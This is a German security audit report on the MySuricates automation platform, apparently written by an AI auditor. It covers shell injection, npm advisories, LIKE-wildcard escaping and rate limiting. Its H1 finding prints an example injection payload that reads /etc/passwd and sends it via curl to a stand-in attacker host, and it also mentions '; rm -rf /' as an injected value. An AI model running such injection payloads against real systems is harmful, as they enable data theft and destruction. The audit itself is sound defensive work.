# Security Audit Report — MySuricates v0.6.2

**Datum:** 2026-03-29
**Auditor:** Claude Opus 4.6 (verifizierte Analyse)
**Scope:** Backend (Spring Boot 3.4), Frontend (React 18), Dependencies, Konfiguration
**Kontext:** Lokal laufende Plattform hinter Tailscale VPN, Single-User API-Key-Auth, SQLite

---

## Executive Summary

**Gesamtrisiko-Bewertung: MITTEL**

| Schweregrad | Anzahl |
|---|---|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 3 |
| LOW | 4 |

**Top-3 dringendste Massnahmen:**

1. **`npm audit fix` ausfuehren** (M1/L4) — behebt 10 von 12 npm-Schwachstellen sofort (5 Min)
2. **LIKE-Wildcard-Escaping in TodoService** (M2) — verhindert Query-Manipulation (15 Min)
3. **Shell-Variable-Escaping evaluieren** (H1) — Design-Entscheidung fuer sicheres Template-Resolving (1-2h)

---

## OWASP Scorecard

| Kategorie | Status | Findings | Dringendster Fund |
|---|---|---|---|
| **A03: Injection** | WARN | 2 | H1: Shell-Injection via Template-Variablen |
| **A07: Authentication** | OK | 0 | Constant-time Key-Vergleich, kein Bypass |
| **A01: Access Control** | OK | 0 | API-Key auf allen Endpoints, Allowlist fuer Settings |
| **A02: Crypto Failures** | OK | 0 | 256-Bit SecureRandom Tokens, kein Klartext |
| **A05: Misconfiguration** | WARN | 2 | M3: Rate-Limiting deaktiviert, L2: fehlende Security-Headers |
| **A07: XSS** | OK | 0 | Kein dangerouslySetInnerHTML, kein eval(), ReactMarkdown escaped |
| **A06: Dependencies** | WARN | 2 | M1: 9 High npm-CVEs, L4: DOMPurify in monaco-editor |
| **A04: Insecure Design** | OK | 0 | Agentic-Safety-Limits, Sub-Workflow-Depth-Check |
| **A08: Software Integrity** | OK | 0 | Flyway-Migrations, keine unsichere Deserialisierung |
| **A09: Logging** | OK | 0 | ActivityLog vorhanden, keine sensitiven Daten geloggt |
| **A10: SSRF** | OK | 0 | Keine user-controlled URL-Fetches im Backend |

---

## Findings Detail

### HIGH (1 Finding)

#### H1: Shell-Injection via Template-Variable-Substitution in Shell-Bloecken

**Risk-Rating:** HIGH
**CVSS-Schaetzung:** 7.2 (bei authentifiziertem Zugriff)

**Betroffene Dateien:**
- `ai-automation-backend/src/main/java/com/automation/service/cli/ShellCommandService.java:34` — `/bin/bash -c command`
- `ai-automation-backend/src/main/java/com/automation/executor/blocks/ShellBlockExecutor.java:35` — `context.resolveTemplate(rawCommand)`

**Beschreibung:**
Shell-Block-Commands werden via `context.resolveTemplate()` mit Context-Variablen substituiert und anschliessend an `ProcessBuilder("/bin/bash", "-c", command)` uebergeben. Ein Context-Wert wie `; rm -rf /` wird ungefiltert als Shell-Code ausgefuehrt.

**Angriffspfad:**
```
POST /api/v1/workflows/{id}/execute
Body: { "context": { "user_input": "; curl attacker.com/exfil?d=$(cat /etc/passwd)" } }
```
Ein Shell-Block mit `echo ${user_input}` fuehrt den injizierten Befehl aus.

**Risiko-Einordnung:**
- Angreifer braucht den API-Key (Auth-Pflicht)
- Shell-Bloecke sind *by design* fuer Command-Ausfuehrung gedacht
- **Reales Risiko:** Context-Variablen aus Webhook-Payloads, Human-Input-Bloecken oder ForEach-Iterationen koennten unbeabsichtigt unsanitisierte Werte enthalten

**Empfohlener Fix:**
Option A — Shell-Escaping per Variable:
```java
// ShellBlockExecutor: Variablen in Shell-Kontexten escapen
String escaped = value.replace("'", "'\\''");
String shellSafe = "'" + escaped + "'";
```

Option B — Opt-in per Block-Config (empfohlen, da rueckwaertskompatibel):
```json
{
  "type": "shell",
  "config": {
    "command": "echo ${user_input}",
    "shell_escape_variables": true
  }
}
```

Option C — Dokumentation/UI-Warnung bei Shell-Bloecken mit externen Variablen.

**Aufwand:** 1-2h (Design-Entscheidung erforderlich)

---

### MEDIUM (3 Findings)

#### M1: npm-Dependencies mit bekannten Schwachstellen

**Risk-Rating:** MEDIUM
**Betroffene Datei:** `ai-automation-frontend/package-lock.json`

**Beschreibung:**
`npm audit` meldet 12 Schwachstellen (9 High, 3 Moderate):

| Paket | Schweregrad | CVE/Advisory | Beschreibung |
|---|---|---|---|
| rollup <4.59.0 | High | GHSA-mw96-cpmx-2vgc | Arbitrary File Write via Path Traversal |
| undici 7.0.0-7.23.0 | High (6x) | GHSA-f269-vfmq-vjvj, GHSA-2mjp-6q6p-2qxm, GHSA-vrm6-8vpv-qv8q, GHSA-v9p9-hfj2-hcw8, GHSA-4992-7rv2-5pvq, GHSA-phc3-fgpg-7m6h | HTTP Smuggling, WebSocket Memory Exhaustion, CRLF Injection, DoS |
| serialize-javascript <=7.0.4 | High (2x) | GHSA-5c6j-r48x-rmvq, GHSA-qj8w-gfj5-8c6v | RCE via RegExp.flags, CPU Exhaustion DoS |

**Risiko-Einordnung:** Diese Pakete sind Build-Dependencies (nicht im Browser-Bundle). Das reale Risiko ist auf Supply-Chain-Angriffe waehrend `npm install`/`npm run build` beschraenkt.

**Empfohlener Fix:**
```bash
cd ai-automation-frontend
npm audit fix          # Behebt 10 von 12 (rollup, undici)
npm audit fix --force  # Behebt restliche 2 (vite-plugin-pwa Breaking Change pruefen)
```

**Aufwand:** 5 Min (+ ggf. vite-plugin-pwa Breaking Change testen)

#### M2: LIKE-Wildcard-Injection in TodoService

**Risk-Rating:** MEDIUM
**Betroffene Datei:** `ai-automation-backend/src/main/java/com/automation/service/todo/TodoService.java:174-183`

**Beschreibung:**
Die `tag`- und `q`-Query-Parameter werden direkt in LIKE-Patterns eingesetzt:
```java
predicates.add(cb.like(root.get("tags"), "%" + tag + "%"));     // Zeile 175
String pattern = "%" + q.toLowerCase() + "%";                    // Zeile 178
```

Die Criteria API parametrisiert den Wert (kein SQL-Injection), aber `%`- und `_`-Zeichen im Input wirken als SQL-LIKE-Wildcards. Ein Angreifer kann mit `tag=%` alle Todos matchen oder mit aufwaendigen Patterns die SQLite-Performance beeintraechtigen.

**Empfohlener Fix:**
```java
private String escapeLikePattern(String input) {
    return input.replace("\\", "\\\\")
                .replace("%", "\\%")
                .replace("_", "\\_");
}

// Verwendung:
String escaped = escapeLikePattern(tag);
predicates.add(cb.like(root.get("tags"), "%" + escaped + "%", '\\'));
```

**Aufwand:** 15 Min

#### M3: Rate-Limiting standardmaessig deaktiviert

**Risk-Rating:** MEDIUM
**Betroffene Datei:** `ai-automation-backend/src/main/resources/application.yml:76`

**Beschreibung:**
```yaml
rate-limit:
  enabled: ${AUTOMATION_RATE_LIMIT_ENABLED:false}  # Default: false
  requests-per-minute: ${AUTOMATION_RATE_LIMIT_RPM:120}
```

Ohne Rate-Limiting kann ein Angreifer mit API-Key beliebig viele Requests senden. Die `RateLimitFilter`-Bucket-Map evicted zudem nie alte Eintraege (minor Memory-Leak bei vielen verschiedenen IPs).

**Empfohlener Fix:**
1. Default auf `true` setzen
2. Eviction-Logik fuer alte Buckets (z.B. `ScheduledExecutorService` alle 5 Min)

**Aufwand:** 5 Min (Default) + 30 Min (Eviction)

---

### LOW (4 Findings)

#### L1: WebSocket API-Key als URL-Query-Parameter

**Risk-Rating:** LOW
**Betroffene Dateien:**
- `ai-automation-frontend/src/components/shared/TerminalPanel.tsx:80` — `?apiKey=${encodeURIComponent(apiKey)}`
- `ai-automation-backend/src/main/java/com/automation/security/WebSocketAuthInterceptor.java:40`

**Beschreibung:**
API-Key erscheint in Browser-History und Server-Access-Logs. Browser-WebSocket-API unterstuetzt keine Custom-Headers — dies ist der einzige Browser-native Weg.

**Empfohlener Fix:** Short-lived Token-Exchange: REST-Call holt einmaligen WS-Token (TTL 30s), der statt des API-Keys als Query-Param gesendet wird.

**Aufwand:** 1-2h

#### L2: Fehlende Security-Headers (CSP, X-Frame-Options)

**Risk-Rating:** LOW
**Beschreibung:**
Weder Backend noch Frontend setzen `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options` oder `Strict-Transport-Security`. Fuer localhost akzeptabel, bei Tailscale-Exposure relevant.

**Empfohlener Fix:**
```java
http.headers(h -> h
    .contentTypeOptions(Customizer.withDefaults())
    .frameOptions(fo -> fo.deny())
);
```

**Aufwand:** 10 Min

#### L3: Deprecierte HostCodexService.buildCommand() Methode

**Risk-Rating:** LOW
**Betroffene Datei:** `ai-automation-backend/src/main/java/com/automation/service/ai/HostCodexService.java:131-148`

**Beschreibung:**
Deprecierte Methode setzt Prompt als CLI-Argument statt stdin. Keine aktiven Caller, aber kompilierbar. Prompt waere in `ps`/`/proc` sichtbar.

**Empfohlener Fix:** Methode loeschen.

**Aufwand:** 2 Min

#### L4: DOMPurify-Vulnerability in monaco-editor Dependency

**Risk-Rating:** LOW
**Advisory:** GHSA-h8r8-wccr-v5f2

**Beschreibung:**
`dompurify <=3.3.1` hat Mutation-XSS-Schwachstellen. Betrifft den Monaco-Editor in der Workflow-Bearbeitung. Angriffsvektor: malicious Content im Editor-Widget.

**Empfohlener Fix:** `npm audit fix`

**Aufwand:** Teil von M1-Fix

---

## Dependency-Vulnerabilities

### npm (Frontend)

| Paket | Version | Schweregrad | Advisory | Fix-Version |
|---|---|---|---|---|
| rollup | <4.59.0 | High | GHSA-mw96-cpmx-2vgc | >=4.59.0 (`npm audit fix`) |
| undici | 7.0.0-7.23.0 | High | 6 CVEs (siehe M1) | >=7.23.1 (`npm audit fix`) |
| serialize-javascript | <=7.0.4 | High | GHSA-5c6j-r48x-rmvq | >=7.0.5 (`npm audit fix --force`) |
| dompurify | <=3.3.1 | Moderate | GHSA-h8r8-wccr-v5f2 | >=3.3.2 (`npm audit fix`) |
| flatted | <=3.4.1 | Moderate | GHSA-rf6f-7fwh-wjgh | >=3.4.2 |

### Maven (Backend)

Keine bekannten Schwachstellen in direkten Dependencies gefunden. Spring Boot 3.4 BOM haelt transitive Dependencies aktuell.

---

## Bestaetigte Sicherheit (Kein Handlungsbedarf)

| Bereich | Pruefergebnis |
|---|---|
| **SQL Injection** | Alle `@Query` nutzen `:paramName` Bind-Parameter. 2 Native-Queries parametrisiert. JdbcTemplate nutzt `?`-Platzhalter. |
| **Jackson Deserialization** | Kein `enableDefaultTyping`, kein `@JsonTypeInfo`. Alle ObjectMapper deserialisieren in konkrete Typen. |
| **XSS (Frontend)** | Kein `dangerouslySetInnerHTML`. ReactMarkdown ohne `rehypeRaw` — HTML wird escaped. Kein `eval()`, kein `new Function()`. |
| **Hardcoded Secrets** | Keine im Sourcecode. API-Key aus DB/Env, nie ueber API-Endpoints lesbar (`ALLOWED_SETTINGS` Allowlist). |
| **CORS** | Korrekt auf `localhost:3000,5173` beschraenkt. `allowCredentials(true)` + Wildcard wird von Spring rejected. |
| **API-Key-Vergleich** | Constant-time via `MessageDigest.isEqual()` in `ApiKeyAuthFilter` und `WebSocketAuthInterceptor`. |
| **Actuator** | Nur `health`/`info`/`metrics` exposed. `health` public, Rest hinter Auth. |
| **Webhook-Tokens** | 256-Bit `SecureRandom` Entropy. Management-Endpoints hinter Auth. |
| **ProcessBuilder (Claude CLI)** | List-basierte Arguments, Prompt via stdin. Kein Shell-Invocation. |
| **Container-Hardening** | `--cap-drop ALL`, `--security-opt no-new-privileges`, Resource-Limits (4GB, 100 PIDs). |
| **Java-Serialisierung** | Kein `ObjectInputStream` im Einsatz. |
| **XXE** | Kein XML-Parser im Einsatz. |
| **Docker Privileged** | Kein `--privileged` Flag. |

---

## Empfohlene Prioritaeten

| Prio | Finding | Aufwand | Risikoreduktion |
|---|---|---|---|
| 1 | `npm audit fix` ausfuehren (M1/L4) | 5 Min | Schliesst 10 bekannte CVEs |
| 2 | LIKE-Wildcard-Escaping in TodoService (M2) | 15 Min | Verhindert Query-Manipulation |
| 3 | Shell-Variable-Escaping evaluieren (H1) | 1-2h | Design-Entscheidung — groesste Angriffsflaeche |
| 4 | Rate-Limiting Default aktivieren (M3) | 5 Min | Schutz vor Brute-Force/DoS |
| 5 | Deprecated Codex-Methode loeschen (L3) | 2 Min | Reduziert Angriffsflaeche |
| 6 | Security-Headers hinzufuegen (L2) | 10 Min | Defense-in-Depth |

---

## Hinweise zur Risiko-Einordnung

H1 erfordert eine **Design-Entscheidung**: Shell-Bloecke sind *by design* fuer beliebige Kommandos. Das Escaping darf bestehende Workflows nicht brechen. Ein `shell_escape_variables: true` Opt-in pro Block-Config oder eine UI-Warnung bei Shell-Bloecken mit externen Variablen ist der pragmatischste Weg.

Die Gesamtbewertung **MITTEL** beruecksichtigt den Deployment-Kontext: Single-User, Tailscale VPN, API-Key-Auth. In einem Multi-User- oder Internet-exponierten Setup waere die Bewertung **HOCH**.

---

gate_status: YELLOW
gate_category: security
gate_description: 1 HIGH Finding (Shell-Injection via Template-Variablen), 3 MEDIUM Findings (npm CVEs, LIKE-Wildcard, Rate-Limiting). Keine CRITICAL Findings. Sofortmassnahmen: npm audit fix, LIKE-Escaping, Shell-Escaping evaluieren.
